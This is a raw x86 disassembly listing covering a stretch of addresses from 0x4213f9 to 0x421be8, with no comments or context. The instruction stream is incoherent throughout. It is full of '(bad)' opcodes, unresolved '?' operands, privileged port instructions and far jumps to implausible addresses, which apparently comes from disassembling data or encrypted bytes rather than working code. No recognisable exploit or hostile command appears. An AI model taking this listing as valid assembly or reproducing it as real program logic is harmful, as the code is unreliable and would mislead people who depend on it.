  4213f9:	imul   ebp,DWORD PTR [edi-0x5c],0x50a5ce92
  421400:	jmp    0xf02faf54
  421405:	popf   
  421406:	adc    al,0x8c
  421408:	sub    edi,DWORD PTR [bx]
  42140b:	jl     0x421489
  42140d:	mov    edx,?
  42140f:	repnz es fs pop edi
  421413:	lea    esi,[eax-0x37f969f3]
  421419:	shl    esi,0x81
  42141c:	mov    DWORD PTR [esi],ebp
  42141e:	jnp    0x421462
  421420:	and    cl,BYTE PTR [esi+edi*1]
  421423:	pushf  
  421424:	mov    bl,0xff
  421426:	(bad)  
  421427:	out    0x33,al
  421429:	inc    eax
  42142a:	add    BYTE PTR [eax],al
  42142c:	outs   dx,DWORD PTR ds:[esi]
  42142d:	into   
  42142e:	(bad)  
  42142f:	in     al,0x93
  421431:	int    0xc8
  421433:	stos   DWORD PTR es:[edi],eax
  421434:	addr16 inc edx
  421436:	add    cl,BYTE PTR [ebp+0x9]
  421439:	inc    esi
  42143a:	dec    edx
  42143b:	int    0x1d
  42143d:	add    al,0x6
  42143f:	inc    edi
  421440:	jle    0x421455
  421442:	jno    0x4213da
  421444:	and    esp,DWORD PTR [ebx]
  421446:	cmp    al,0x8a
  421448:	dec    esi
  421449:	or     ecx,DWORD PTR [ebx+0x2f86cc1f]
  42144f:	or     BYTE PTR [edx],cl
  421451:	(bad)  
  421452:	fadd   DWORD PTR [edi-0x6a16e38d]
  421458:	gs jmp 0x4214a2
  42145b:	xor    al,0x59
  42145d:	xor    eax,0xd22877fc
  421462:	in     al,0xc
  421464:	popf   
  421465:	leave  
  421466:	xchg   BYTE PTR [edi+0x3e026fe2],dl
  42146c:	xor    eax,0x2861c089
  421471:	inc    esi
  421472:	adc    ebx,DWORD PTR [eax-0x4b]
  421475:	jno    0x421454
  421477:	cs xchg esi,eax
  421479:	sbb    DWORD PTR [di-0x6f],eax
  42147d:	mov    bl,0x2b
  42147f:	or     al,0xa9
  421481:	je     0x4214ca
  421483:	push   0x780552b5
  421488:	cmp    DWORD PTR ss:[ebp+0x38da237d],0xfffffffc
  421490:	pop    es
  421491:	adc    eax,0xf1651e40
  421496:	call   0x11d14b88
  42149b:	xor    DWORD PTR ss:[ecx+0x4],esp
  42149f:	or     edi,eax
  4214a1:	mov    esi,0x13e5fb19
  4214a6:	call   0x478bacb
  4214ab:	adc    ecx,DWORD PTR [ebx+0x38a30e00]
  4214b1:	mov    eax,0xbe59ccfc
  4214b6:	aam    0x36
  4214b8:	mov    ebx,0x23a23c3e
  4214bd:	pop    esp
  4214be:	aas    
  4214bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214c0:	pop    edx
  4214c1:	cmp    al,BYTE PTR [ebx-0x58]
  4214c4:	ss pop es
  4214c6:	adc    BYTE PTR [ecx],cl
  4214c8:	test   al,0x86
  4214cb:	push   0x9d6073f5
  4214d0:	cs inc ecx
  4214d3:	adc    eax,0xa74ce03a
  4214d8:	and    eax,0x69efd8a9
  4214dd:	add    edx,edx
  4214df:	pop    esi
  4214e0:	retf   
  4214e1:	adc    al,0xf3
  4214e3:	es or  al,0x42
  4214e6:	ss mov cl,0xdf
  4214e9:	xor    BYTE PTR [ebp+0x6a],0x33
  4214ed:	js     0x4214be
  4214ef:	mov    ecx,DWORD PTR [ebx-0x28]
  4214f2:	mov    BYTE PTR [esi+0x5a156129],ah
  4214f8:	bound  edx,QWORD PTR [ebx+0x295c2688]
  4214fe:	sub    al,BYTE PTR [edi-0x5dd895c0]
  421504:	repz push 0xa8e5c7a4
  42150a:	push   eax
  42150b:	nop
  42150c:	cld    
  42150d:	out    0x72,al
  42150f:	std    
  421510:	gs jne 0x4214fe
  421513:	hlt    
  421514:	inc    ebx
  421515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421516:	test   BYTE PTR [ebx],0xa9
  421519:	lock in eax,dx
  42151b:	aad    0xd3
  42151d:	add    eax,0xdf763cd9
  421522:	jl     0x42154a
  421524:	add    BYTE PTR [edi],al
  421526:	xor    edi,DWORD PTR [ecx+0x361f37bf]
  42152c:	les    ebp,FWORD PTR [ebx-0x51e7954f]
  421532:	scas   al,BYTE PTR es:[edi]
  421533:	cmc    
  421534:	mov    ch,0xa4
  421536:	xchg   BYTE PTR [ecx],ch
  421538:	push   es
  421539:	imul   eax,DWORD PTR [esi+ebp*2],0x8e438f1e
  421540:	xlat   BYTE PTR ds:[ebx]
  421541:	ret    0x2d34
  421544:	imul   eax,DWORD PTR [edx+ecx*8],0xe49dd234
  42154b:	jmp    0x57ff947a
  421550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421551:	dec    ecx
  421552:	sbb    al,0x51
  421554:	in     al,0x8c
  421556:	mov    al,ds:0x5b6e3db7
  42155b:	push   ss
  42155c:	outs   dx,BYTE PTR ds:[esi]
  42155d:	fdiv   DWORD PTR [eax+0x26]
  421560:	xor    BYTE PTR [esi],0xb0
  421563:	cmp    BYTE PTR [ecx-0x6b],dl
  421566:	out    dx,al
  421567:	int3   
  421568:	or     BYTE PTR [eax+0x7826dcd1],cl
  42156e:	push   ebx
  42156f:	and    BYTE PTR ds:0x8fe034a1,al
  421575:	or     al,0xbe
  421577:	mov    bh,BYTE PTR [eax]
  421579:	clc    
  42157a:	or     al,0xa6
  42157c:	dec    eax
  42157d:	enter  0xce01,0x3a
  421581:	dec    esp
  421582:	cmp    ecx,DWORD PTR [esi]
  421584:	mov    bl,0xb9
  421586:	fnstsw WORD PTR [ebx-0x5924af7e]
  42158c:	dec    ebp
  42158d:	mov    ah,0x1b
  42158f:	in     eax,dx
  421590:	lods   eax,DWORD PTR cs:[esi]
  421592:	sub    cl,BYTE PTR [ecx]
  421594:	scas   al,BYTE PTR es:[edi]
  421595:	mov    edx,DWORD PTR [ebp-0x2fe8223a]
  42159b:	sub    ecx,DWORD PTR [esi-0x71]
  42159e:	es out 0x48,eax
  4215a1:	xchg   edi,eax
  4215a2:	jnp    0x421538
  4215a4:	in     eax,dx
  4215a5:	inc    esp
  4215a6:	add    BYTE PTR [esi+edx*1-0x66],bl
  4215aa:	sub    ecx,edx
  4215ac:	mov    dh,0x7d
  4215ae:	sti    
  4215af:	fild   WORD PTR [edi]
  4215b1:	push   ebx
  4215b2:	push   0x754d7735
  4215b7:	imul   ebp,ebx,0xfe018528
  4215bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215be:	dec    esp
  4215bf:	in     al,dx
  4215c0:	shl    BYTE PTR [edx],0x49
  4215c3:	(bad)  
  4215c4:	and    eax,0x2da40396
  4215c9:	push   ebx
  4215ca:	out    0xb1,al
  4215cc:	bound  ebx,QWORD PTR [eax-0x27]
  4215cf:	test   DWORD PTR [esi],edx
  4215d1:	add    DWORD PTR [ebp+0x7e92f7b1],0xffffff82
  4215d8:	add    al,0xf
  4215da:	mov    esi,0xe871197e
  4215df:	jmp    0x42164b
  4215e1:	push   esi
  4215e2:	mov    dl,BYTE PTR [eax+esi*8-0x3d]
  4215e6:	out    dx,al
  4215e7:	popf   
  4215e8:	adc    ch,BYTE PTR [esi]
  4215ea:	or     eax,0x56ed8f3d
  4215ef:	add    al,0x12
  4215f1:	sbb    cl,BYTE PTR [edi+edi*1]
  4215f4:	and    DWORD PTR [eax],ebx
  4215f6:	add    eax,0x26c12bd
  4215fb:	jne    0x421672
  4215fd:	test   DWORD PTR [esi],eax
  4215ff:	adc    eax,0x5f8777d5
  421604:	cli    
  421605:	or     al,0xc2
  421607:	add    DWORD PTR [esi-0x45],edi
  42160a:	das    
  42160b:	jmp    0x6198:0xf35a76a6
  421612:	test   eax,0xde59846e
  421617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421618:	popa   
  421619:	mov    al,ds:0x5b2a48ae
  42161e:	push   0xa6bb8f05
  421623:	dec    BYTE PTR [ebp+0x78]
  421626:	adc    al,0xef
  421628:	xor    BYTE PTR [edx+ebx*8+0xe17696a],dl
  42162f:	clc    
  421630:	sbb    esi,DWORD PTR [ebp-0x70]
  421633:	or     ecx,DWORD PTR es:[eax-0x13]
  421637:	push   es
  421638:	add    esp,edx
  42163a:	pop    es
  42163b:	lahf   
  42163c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42163d:	add    eax,0x7019e9be
  421642:	icebp  
  421643:	xchg   esp,eax
  421644:	inc    esp
  421645:	push   cs
  421646:	int3   
  421647:	push   edx
  421648:	jns    0x4216aa
  42164a:	inc    edx
  42164b:	mov    WORD PTR [ebx+0x4af157a],?
  421651:	dec    ecx
  421652:	sbb    edx,eax
  421654:	or     edi,DWORD PTR [ebx]
  421656:	pop    ss
  421657:	gs pop eax
  421659:	or     eax,0x828ae031
  42165e:	je     0x421619
  421660:	mov    bl,ch
  421662:	out    dx,al
  421663:	jae    0x4216c3
  421665:	cmp    eax,0x3e567029
  42166a:	arpl   WORD PTR [edi+eax*2+0x6964614f],bp
  421671:	fwait
  421672:	ret    0x35cc
  421675:	sub    cl,dh
  421677:	popf   
  421678:	cmp    dl,ah
  42167a:	hlt    
  42167b:	and    DWORD PTR ss:[esi+0x44],eax
  42167f:	fs scas al,BYTE PTR es:[edi]
  421681:	dec    esi
  421682:	xlat   BYTE PTR ds:[ebx]
  421683:	push   ds
  421684:	fdiv   DWORD PTR [esi+0x179b1085]
  42168a:	xchg   esp,eax
  42168b:	scas   eax,DWORD PTR es:[edi]
  42168c:	xor    ch,al
  42168e:	retf   0x4e19
  421691:	xchg   edi,esp
  421693:	sbb    edi,DWORD PTR [ecx]
  421695:	loopne 0x421707
  421697:	sbb    ebp,ebp
  421699:	cld    
  42169a:	sub    bl,dl
  42169c:	sub    DWORD PTR ds:0x9664bca6,0xffffffdb
  4216a3:	add    eax,0x5d1cb184
  4216a8:	fimul  DWORD PTR [ebx+0x23]
  4216ab:	push   edi
  4216ac:	jbe    0x42169d
  4216ae:	in     al,0xaf
  4216b0:	sub    ecx,esi
  4216b2:	ss inc ebx
  4216b4:	add    eax,0xc952e2af
  4216b9:	mov    eax,0xfda71970
  4216be:	jl     0x4216d7
  4216c0:	xor    bh,BYTE PTR ds:0x57184a3f
  4216c6:	sbb    al,0x41
  4216c8:	adc    BYTE PTR [ecx+ebp*4-0x1cc44e5b],al
  4216cf:	enter  0xd45,0xd5
  4216d3:	mov    ebx,0xfa338ca0
  4216d8:	ds jl  0x42169e
  4216db:	jns    0x4216d4
  4216dd:	mov    edi,DWORD PTR [edi]
  4216df:	push   eax
  4216e0:	leave  
  4216e1:	leave  
  4216e2:	jo     0x421706
  4216e4:	sbb    DWORD PTR [esi],ecx
  4216e6:	fisubr WORD PTR [edi-0x44102e7a]
  4216ec:	sbb    esi,esi
  4216ee:	push   ebx
  4216ef:	mov    bh,BYTE PTR [ecx]
  4216f1:	jmp    0x421726
  4216f3:	mov    eax,0xfb147d68
  4216f8:	pop    edi
  4216f9:	sbb    eax,DWORD PTR [edx]
  4216fb:	add    ebx,eax
  4216fd:	xlat   BYTE PTR ds:[ebx]
  4216fe:	push   ebx
  4216ff:	mov    ds:0xf374f99,al
  421704:	jns    0x4216b0
  421706:	push   0x60
  421708:	fdiv   st(7),st
  42170a:	jne    0x4216cc
  42170c:	xchg   ebx,eax
  42170d:	bts    DWORD PTR [esi-0x41],edx
  421711:	sbb    al,0xa7
  421713:	push   ds
  421714:	adc    eax,0x7f445580
  421719:	sbb    ecx,DWORD PTR [ebx+0x2a3781e0]
  42171f:	or     BYTE PTR [ebx],al
  421721:	pop    ebp
  421722:	inc    ebx
  421723:	fstp   DWORD PTR [edi-0xd]
  421726:	mov    ds:0x86f703b4,eax
  42172b:	mov    bh,0x5c
  42172d:	inc    ebp
  42172e:	dec    eax
  42172f:	jns    0x42172a
  421731:	xor    edi,eax
  421733:	mov    edx,0x826dd13f
  421738:	sar    DWORD PTR [ecx],cl
  42173a:	push   edx
  42173b:	push   ss
  42173c:	test   BYTE PTR [eax+0x48],dh
  42173f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421740:	arpl   WORD PTR [edi+0x52],si
  421743:	fs pop ecx
  421745:	lahf   
  421746:	jl     0x42172a
  421748:	cmp    ah,BYTE PTR [ebp+0x31]
  42174b:	leave  
  42174c:	daa    
  42174d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42174e:	neg    esi
  421750:	xchg   DWORD PTR [ecx],esp
  421752:	dec    eax
  421753:	dec    esi
  421754:	jnp    0x42179c
  421756:	push   es
  421757:	sbb    cl,BYTE PTR [ebp+0x290d08b1]
  42175d:	push   es
  42175e:	dec    ebp
  42175f:	add    DWORD PTR [ebx],0xffffffde
  421762:	gs stc 
  421764:	(bad)  
  421766:	lea    edx,[ebx]
  421768:	sub    bl,cl
  42176a:	push   ebp
  42176b:	push   edi
  42176c:	xor    DWORD PTR [ebx-0x150e5b7f],0xffffffce
  421773:	aaa    
  421774:	shl    BYTE PTR [bp+si+0xe],0x28
  421779:	(bad)  
  42177a:	mov    al,0xe8
  42177c:	fscale 
  42177f:	mov    edx,0x433c6d97
  421784:	aad    0x6b
  421786:	mov    bl,0xfb
  421788:	sub    DWORD PTR [ebp+0x79e4d556],edi
  42178e:	pop    esi
  42178f:	out    dx,al
  421790:	sbb    esp,ebp
  421792:	test   BYTE PTR [edi+ebx*1],0x87
  421796:	out    dx,al
  421797:	cli    
  421798:	fdiv   st,st(2)
  42179a:	popf   
  42179b:	or     DWORD PTR [edx-0x3d],esi
  42179e:	loop   0x42174a
  4217a0:	scas   eax,DWORD PTR es:[edi]
  4217a1:	push   eax
  4217a2:	mov    al,ds:0x541df74d
  4217a7:	fsubr  QWORD PTR [ecx]
  4217a9:	(bad)  
  4217aa:	fsubr  DWORD PTR [ecx+0x13]
  4217ad:	push   ds
  4217ae:	mov    ebx,0xa7b3b002
  4217b3:	jbe    0x4217f9
  4217b5:	add    cl,0x3c
  4217b8:	pop    ebp
  4217b9:	daa    
  4217ba:	std    
  4217bb:	sub    dh,BYTE PTR [si+0x1]
  4217bf:	jge    0x4217e5
  4217c1:	mov    bl,0x39
  4217c3:	xchg   ebx,eax
  4217c4:	xor    bl,0x34
  4217c7:	xlat   BYTE PTR ds:[ebx]
  4217c8:	push   edi
  4217c9:	sub    eax,0xfdf89889
  4217ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217cf:	js     0x421776
  4217d1:	dec    eax
  4217d2:	cmp    al,0x91
  4217d4:	sub    ch,0x8d
  4217d7:	test   DWORD PTR [eax+ebx*4-0x61],esi
  4217db:	test   eax,0x805e504f
  4217e0:	dec    ebp
  4217e1:	add    BYTE PTR [esi-0x121a85f],0xfe
  4217e8:	adc    dl,BYTE PTR [ecx+0x37]
  4217eb:	stc    
  4217ec:	mov    ah,0xa7
  4217ee:	fdivr  DWORD PTR [esp+ebp*8]
  4217f1:	push   edi
  4217f2:	jb     0x421826
  4217f4:	test   eax,0x961d33ba
  4217f9:	call   0xe857:0x536e25bf
  421800:	das    
  421801:	fdiv   DWORD PTR [edx]
  421803:	xchg   esp,eax
  421804:	les    edi,FWORD PTR [edx-0x40]
  421807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421808:	push   es
  421809:	pop    eax
  42180a:	pop    edx
  42180b:	loope  0x42180e
  42180d:	mov    cl,0xe4
  42180f:	add    ebx,DWORD PTR [edi+0x7e93b98c]
  421815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421816:	push   es
  421817:	in     al,0x9f
  421819:	retf   
  42181a:	ins    BYTE PTR es:[edi],dx
  42181b:	aad    0x7
  42181d:	sbb    cl,BYTE PTR [ecx]
  42181f:	lock xchg esi,esp
  421822:	dec    eax
  421823:	icebp  
  421824:	sbb    eax,0x12755289
  421829:	xchg   DWORD PTR [edi+0x56],ecx
  42182c:	pop    ds
  42182d:	aam    0xf9
  42182f:	rcr    BYTE PTR [esi],0x4d
  421832:	mov    dh,0x59
  421834:	cld    
  421835:	mov    bl,0xcf
  421837:	(bad)
  42183b:	jg     0x4218b1
  42183d:	sub    cl,BYTE PTR [edi-0x69731b96]
  421843:	jl     0x421861
  421845:	mov    WORD PTR [ebp+0x4ab3a867],fs
  42184b:	fst    QWORD PTR [eax-0x6432ffea]
  421851:	inc    edi
  421852:	lods   eax,DWORD PTR ds:[esi]
  421853:	cwde   
  421854:	call   0x9b05022d
  421859:	out    dx,eax
  42185a:	adc    ecx,DWORD PTR [esi+edi*8+0x20faf5f3]
  421861:	test   al,0x53
  421863:	mov    al,ds:0xaa83fda1
  421868:	sbb    BYTE PTR [esp+ebx*2-0x490f100d],dh
  42186f:	outs   dx,DWORD PTR ds:[esi]
  421870:	xor    al,0xe7
  421872:	sub    eax,0xa73d3a0c
  421877:	mov    DWORD PTR [ebx-0x56],edi
  42187a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42187b:	addr16 inc esp
  42187d:	shr    DWORD PTR [edx],1
  42187f:	mov    edi,0x5fd993ab
  421884:	cmp    DWORD PTR [esi+0x1c],esp
  421887:	push   eax
  421888:	xor    edx,esp
  42188a:	test   BYTE PTR [edx],0x2c
  42188d:	jmp    0x67bc:0xeffd90b7
  421894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421895:	(bad)  
  421896:	idiv   DWORD PTR [esi+0x57]
  421899:	adc    DWORD PTR [ebx],esp
  42189b:	fild   WORD PTR ds:0xf7fc3412
  4218a1:	fwait
  4218a2:	add    DWORD PTR [ebp-0x1387cb21],ebp
  4218a8:	add    eax,DWORD PTR [eax+0x8]
  4218ab:	pop    ebx
  4218ac:	lods   al,BYTE PTR ds:[esi]
  4218ad:	mov    ecx,0x1712d77a
  4218b2:	je     0x421885
  4218b4:	imul   ecx,edi,0x55
  4218b7:	data16 adc bl,al
  4218ba:	in     eax,dx
  4218bb:	shld   esi,esp,0xe0
  4218bf:	(bad)  
  4218c1:	shl    BYTE PTR [edi-0x5e63e0e9],0x97
  4218c8:	js     0x421949
  4218ca:	jmp    0xfc3b:0xae8a364c
  4218d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218d2:	mov    edi,DWORD PTR [ecx-0x64]
  4218d5:	(bad)
  4218d8:	push   0xdf94967
  4218dd:	pop    eax
  4218de:	pshufw mm3,QWORD PTR [esi+edi*4],0x2a
  4218e3:	ja     0x4218be
  4218e5:	push   ss
  4218e6:	pop    ecx
  4218e7:	sub    edx,DWORD PTR [ebx]
  4218e9:	pop    esp
  4218ea:	sub    dl,bl
  4218ec:	stc    
  4218ed:	mov    esp,0x41d864fc
  4218f2:	std    
  4218f3:	mov    ebx,0x7870e618
  4218f8:	cmp    al,0x74
  4218fa:	and    DWORD PTR [edx],edx
  4218fc:	mov    ah,0x29
  4218fe:	xchg   edi,eax
  4218ff:	sub    al,0x50
  421901:	pop    es
  421902:	fistp  QWORD PTR [ebp+0x432c5a60]
  421908:	aas    
  421909:	adc    eax,0xe206ab3b
  42190e:	setns  BYTE PTR [eax]
  421911:	jnp    0x4218da
  421913:	jmp    0xacfd:0x32a573ea
  42191a:	call   0xadb69b88
  42191f:	xor    dl,ch
  421921:	mul    ch
  421923:	stos   DWORD PTR es:[edi],eax
  421924:	ucomiss xmm2,DWORD PTR [ecx-0x69012571]
  42192b:	or     eax,0xd52847e5
  421930:	data16 cmp al,dh
  421933:	das    
  421934:	mov    bl,0xc8
  421936:	in     eax,dx
  421937:	mov    bh,0x36
  421939:	cmp    DWORD PTR [ebx+0x6792eccc],ecx
  42193f:	or     eax,0x666b5c36
  421944:	popf   
  421945:	add    eax,0x76db2c2a
  42194a:	loope  0x421940
  42194c:	cdq    
  42194d:	or     BYTE PTR [edi-0x4aa6a5d8],dh
  421953:	jb     0x4218e0
  421955:	or     al,0x15
  421957:	out    0x66,eax
  421959:	push   cs
  42195a:	in     al,0x81
  42195c:	or     al,BYTE PTR [edi]
  42195e:	mov    bh,0xcd
  421960:	(bad)  
  421961:	repnz xor edi,DWORD PTR [ecx+0x5a72523a]
  421968:	jae    0x4219d3
  42196a:	out    dx,al
  42196b:	and    edi,DWORD PTR [ecx+0x7]
  42196e:	push   0xffffffdb
  421970:	push   DWORD PTR [ecx-0xc]
  421973:	ror    BYTE PTR [eax+ecx*4],1
  421976:	add    DWORD PTR ds:0x1d07e8fd,esi
  42197c:	or     BYTE PTR [esi+0x33],0x9d
  421980:	jmp    FWORD PTR [edx]
  421982:	cs xchg ah,bl
  421985:	jae    0x4219f2
  421987:	repz xchg edi,eax
  421989:	push   edi
  42198a:	test   DWORD PTR [edx-0x47],ebp
  42198d:	lock mov ah,0xdd
  421990:	inc    esi
  421991:	inc    eax
  421992:	ins    DWORD PTR es:[edi],dx
  421993:	and    esp,DWORD PTR [edx]
  421995:	ds aam 0x8c
  421998:	icebp  
  421999:	jne    0x4219b2
  42199b:	dec    esi
  42199c:	int    0xb1
  42199e:	cmp    BYTE PTR [eax+0x61],al
  4219a1:	pop    ecx
  4219a2:	test   BYTE PTR [eax-0x6f7051b6],ah
  4219a8:	add    ch,BYTE PTR [ecx+0xb]
  4219ab:	adc    edi,ebx
  4219ad:	mov    dl,0x87
  4219af:	out    dx,al
  4219b0:	mov    ebx,0xaa48cf66
  4219b5:	mov    WORD PTR [ecx+0x321c21df],?
  4219bb:	inc    ebx
  4219bc:	pop    ss
  4219bd:	xchg   BYTE PTR [edx-0x72],ch
  4219c0:	mov    bl,0x70
  4219c2:	jbe    0x4219d8
  4219c4:	sub    al,0x9e
  4219c6:	test   DWORD PTR [ecx+edx*2+0x104b2f11],ebp
  4219cd:	fstp   TBYTE PTR es:[edx+0x1a]
  4219d1:	jbe    0x42196d
  4219d3:	mov    bh,0x5
  4219d5:	adc    dl,dh
  4219d7:	loope  0x421a2e
  4219d9:	call   0xf25c412a
  4219de:	adc    eax,0x700ea86
  4219e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219e4:	xchg   DWORD PTR [ebx+0x4f66b6b6],ebx
  4219ea:	push   esi
  4219eb:	outs   dx,BYTE PTR ds:[esi]
  4219ec:	or     bh,BYTE PTR [edi+ebx*1-0x3bf8a0c4]
  4219f3:	ror    BYTE PTR [ecx+0x1acea2da],1
  4219f9:	iret   
  4219fa:	in     al,dx
  4219fb:	stos   BYTE PTR es:[edi],al
  4219fc:	adc    BYTE PTR [ebp+0x442ab5aa],ch
  421a02:	out    0xc1,al
  421a04:	call   0x9f92:0xeb1f12b5
  421a0b:	loopne 0x421a6d
  421a0d:	pop    eax
  421a0e:	shr    ebx,cl
  421a10:	in     eax,dx
  421a11:	(bad)
  421a15:	push   ebp
  421a16:	sub    ah,BYTE PTR [edi-0x46]
  421a19:	xchg   esi,eax
  421a1a:	sbb    cl,BYTE PTR [esi]
  421a1c:	adc    ah,BYTE PTR [ebx+0x343d6f6f]
  421a22:	popa   
  421a23:	sbb    dl,BYTE PTR ds:0x69d5acb
  421a29:	test   eax,0x265b0e00
  421a2e:	fs call 0xd850:0xcbb252f0
  421a36:	sbb    dl,bl
  421a38:	imul   dh
  421a3a:	sub    DWORD PTR [eax-0x4d],ecx
  421a3d:	daa    
  421a3e:	std    
  421a3f:	cmp    BYTE PTR [eax+0x3846d851],al
  421a45:	imul   esp,DWORD PTR [edi],0xffffffa7
  421a48:	dec    ebp
  421a49:	push   cs
  421a4a:	repz dec esp
  421a4c:	add    ah,BYTE PTR [edi+0x39]
  421a4f:	rcl    ah,0xa
  421a52:	xchg   ebp,eax
  421a53:	mov    ds:0xd0cdd4ce,al
  421a58:	jae    0x421aaf
  421a5a:	aad    0xd9
  421a5c:	dec    ebx
  421a5d:	adc    DWORD PTR [edx+0x54],ebp
  421a60:	mov    ds:0xa5c986b9,eax
  421a65:	ins    DWORD PTR es:[edi],dx
  421a66:	daa    
  421a67:	jmp    DWORD PTR [eax-0x71]
  421a6a:	pop    esi
  421a6b:	imul   ebp,ebp,0x13
  421a6e:	scas   al,BYTE PTR es:[edi]
  421a6f:	dec    esi
  421a70:	xlat   BYTE PTR ds:[ebx]
  421a71:	jno    0x421a04
  421a73:	shl    BYTE PTR [esi+0x7],1
  421a76:	lods   eax,DWORD PTR ds:[esi]
  421a77:	xchg   DWORD PTR [edi+0x29],esp
  421a7a:	test   DWORD PTR [esi+eax*2+0x16c59fe0],ecx
  421a81:	aaa    
  421a82:	push   0xa72465e9
  421a87:	fst    DWORD PTR [ebx+ecx*4-0x1f8ec535]
  421a8e:	xlat   BYTE PTR ds:[ebx]
  421a8f:	aad    0xb0
  421a91:	push   ebp
  421a92:	dec    esi
  421a93:	mov    eax,DWORD PTR [ecx+edx*2+0x5c048aa9]
  421a9a:	inc    esi
  421a9b:	push   ss
  421a9c:	xchg   ecx,eax
  421a9d:	int    0xd
  421a9f:	dec    ebp
  421aa0:	sub    esp,DWORD PTR [esp+ecx*2+0x18]
  421aa4:	repnz leave 
  421aa6:	mov    ah,0x90
  421aa8:	sar    BYTE PTR [eax+0x42033ada],cl
  421aae:	dec    esp
  421aaf:	mov    eax,ds:0x54ca88dd
  421ab4:	and    DWORD PTR [esi+0x23],edx
  421ab7:	inc    edx
  421ab8:	rol    DWORD PTR [edx],1
  421aba:	out    dx,al
  421abb:	es dec eax
  421abd:	mov    ds:0xfba708fc,eax
  421ac2:	ret    
  421ac3:	icebp  
  421ac4:	mov    cl,0xba
  421ac6:	sbb    bh,BYTE PTR [edx-0x25c26c9a]
  421acc:	or     al,BYTE PTR [esi+0x67b68aed]
  421ad2:	xchg   edx,eax
  421ad3:	popf   
  421ad4:	popf   
  421ad5:	cmp    al,0x3e
  421ad7:	retf   
  421ad8:	out    0x6a,eax
  421ada:	sub    DWORD PTR [edi+edi*4+0x5b],ebx
  421ade:	xchg   ebx,eax
  421adf:	lods   al,BYTE PTR ds:[esi]
  421ae0:	sti    
  421ae1:	inc    BYTE PTR [ecx]
  421ae3:	sub    dl,BYTE PTR [ebx]
  421ae5:	or     al,0x1b
  421ae7:	outs   dx,BYTE PTR ds:[esi]
  421ae8:	mov    DWORD PTR [esi+0x38de3de3],0x83796bb4
  421af2:	sub    BYTE PTR [ecx],dl
  421af4:	pop    esp
  421af5:	add    eax,0xefe41bf8
  421afa:	mul    BYTE PTR [ebx-0x21]
  421afd:	sub    al,0xd5
  421aff:	cld    
  421b00:	lahf   
  421b01:	adc    DWORD PTR [edi-0x7aebdcc0],0x9aee2e7f
  421b0b:	inc    esp
  421b0c:	(bad)  
  421b0d:	xor    bh,bl
  421b0f:	lods   al,BYTE PTR ds:[esi]
  421b10:	lea    eax,[ebx+edi*1-0x2c1085ae]
  421b17:	loope  0x421b06
  421b19:	xchg   BYTE PTR [ecx-0x60671849],dh
  421b1f:	and    al,bl
  421b21:	xchg   ebx,eax
  421b22:	cmc    
  421b23:	push   ss
  421b24:	scas   al,BYTE PTR es:[edi]
  421b25:	jbe    0x421b91
  421b27:	mov    ds:0x5cc645b9,eax
  421b2c:	mov    dh,0xf
  421b2e:	jae    0x421b89
  421b30:	add    dl,BYTE PTR [edi-0x6d]
  421b33:	popa   
  421b34:	rcl    DWORD PTR [ebx+0xe],cl
  421b37:	retf   0x59fa
  421b3a:	(bad)  
  421b3b:	icebp  
  421b3c:	rol    DWORD PTR [ecx-0x13],1
  421b3f:	xchg   BYTE PTR [edi+0x69efb9df],bl
  421b45:	loop   0x421b93
  421b47:	pop    edi
  421b48:	mov    eax,ds:0xbb204baf
  421b4d:	jmp    0x6150:0x844b2609
  421b54:	fnsave [edi]
  421b56:	ja     0x421b96
  421b58:	mov    ds:0xc5cb6be5,eax
  421b5d:	sub    edi,edi
  421b5f:	or     eax,0x1c7c41b0
  421b64:	xor    DWORD PTR [edx-0x2367018],esi
  421b6a:	push   0xffffff82
  421b6c:	repnz xchg ebx,eax
  421b6e:	sub    al,0xb6
  421b70:	imul   edx,DWORD PTR [edi+0x4c83e45e],0xb3c3c329
  421b7a:	adc    eax,0x4672753c
  421b7f:	dec    esp
  421b80:	es sub edi,esi
  421b83:	bound  esi,QWORD PTR [esi]
  421b85:	js     0x421ba2
  421b87:	push   cs
  421b88:	mov    ds:0x883e9ecf,al
  421b8d:	mov    bh,0x5f
  421b8f:	sub    esp,esp
  421b91:	(bad)  
  421b92:	dec    edi
  421b93:	call   0x3775128b
  421b98:	(bad)  
  421b99:	fidivr WORD PTR [ebx+0x20]
  421b9c:	xchg   esi,eax
  421b9d:	xlat   BYTE PTR ds:[ebx]
  421b9e:	addr16 pushf 
  421ba0:	inc    edi
  421ba1:	in     al,0x89
  421ba3:	fdivp  st(7),st
  421ba5:	adc    edx,DWORD PTR [ecx]
  421ba7:	add    eax,0x8c145862
  421bac:	call   0xbfb6:0xd8417494
  421bb3:	ror    bh,1
  421bb5:	xchg   edi,eax
  421bb6:	mov    ebx,0x15b53889
  421bbb:	pop    esp
  421bbc:	lahf   
  421bbd:	je     0x421bbf
  421bbf:	lods   al,BYTE PTR ds:[esi]
  421bc0:	dec    edi
  421bc1:	adc    ebx,DWORD PTR [edx]
  421bc3:	and    al,0xc
  421bc5:	pop    ds
  421bc6:	aad    0x4d
  421bc8:	xor    al,0x77
  421bca:	adc    al,0x8a
  421bcc:	jne    0x421c39
  421bce:	mov    cl,0xba
  421bd0:	pop    ecx
  421bd1:	ss xchg esi,eax
  421bd3:	jbe    0x421b8b
  421bd5:	xlat   BYTE PTR ds:[ebx]
  421bd6:	inc    ebx
  421bd7:	nop
  421bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bd9:	fadd   QWORD PTR [ebp+0x17]
  421bdc:	xor    DWORD PTR [ecx],edi
  421bde:	and    eax,0x9a46c46e
  421be3:	mov    edi,0xd3946a94
  421be8:	or     edx,DWORD PTR [eax+0x20a8ba1b]
